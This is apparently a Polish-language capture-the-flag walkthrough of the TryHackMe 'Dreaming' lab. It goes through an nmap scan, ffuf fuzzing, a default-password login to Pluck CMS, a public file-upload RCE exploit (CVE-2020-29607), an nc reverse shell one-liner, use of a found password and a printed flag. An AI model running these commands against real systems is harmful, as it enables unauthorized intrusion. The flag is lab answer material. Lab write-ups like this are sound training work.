# Dreaming v1.2
IP=10.10.223.148

## Rekonesans
Przeprowadzamy wstępny skan za pomocą narzędzia nmap:
```sh
sudo nmap -sV -sC 10.10.223.148
```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-26 13:46 EDT
Nmap scan report for 10.10.223.148
Host is up (0.099s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```
Port 80 (HTTP) jest najważniejszy ze względu na potencjalne zagrożenia bezpieczeństwa.

## Skanowanie

### Port 80
Rozpoczynamy od sprawdzenia portu 80:

![Apache](img/Apache.JPG)

Jest to domyślna strona Apache 2. W źródle strony nie ma nic ciekawego. 
Przejdźmy do enumeracji subdomen przy pomocy narzędzia ffuf:
```
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.223.148/FUZZ -c
```

![Ffuf](img/Ffuf.JPG)

Znaleźliśmy subdomenę app, na której znajduje się folder z aplikacją:

![App](img/App.JPG)

Po wejściu na stronę przechodzimy do zakładki admin, która przenosi nas do panelu logowania:

![Dreaming](img/Dreaming.JPG)

![Login_Panel](img/Login_Panel.JPG)

Logujemy się do systemu przy pomocy standardowych danych:

```
password:password
```

![Pluck](img/Pluck.JPG)

Widzimy, że aplikacja to Pluck 4.7.13. Sprawdzamy czy ta wersja jest podatna:

```
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
```
```
CVE: 2020-29607
```

Pobieramy exploit, nadajemy mu uprawnienia i go uruchamiamy:
```
python 49909.py 10.10.223.148 80 password /app/pluck-4.7.13
```
Uzyskujemy w ten sposób shella:

![Shell](img/Shell.JPG)

## Eksploitacja

Spróbujemy uzyskać dostęp do systemu poprzez reverse shell, używając następującej komendy:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
```
Następnie nasłuchujemy połączeń za pomocą narzędzia netcat:
```
nc -lvnp [Port]
```
![Access](img/Access.JPG)

## Zwiększenie poziomu uprawnień

Po otrzymaniu dostępu do serwera sprawdzamy katalog głowny, jednak nasze uprawnienia nie są wystarczające, aby otwierać znajdujące się tam pliki. Przeszukując system znajdujemy hasło użytkownika lucien w katalogu /opt:

![Lucien](img/Lucien.JPG)

```
HeyLucien#@1999!
```

Logujemy się na konto użytkownika lucien:

```
www-data@dreaming:/$ su lucien
Password: 
lucien@dreaming:/$ 
```

W katalogu domowym znajdujemy pierwsza flagę:
```
THM{TH3_L1BR4R14N}
```


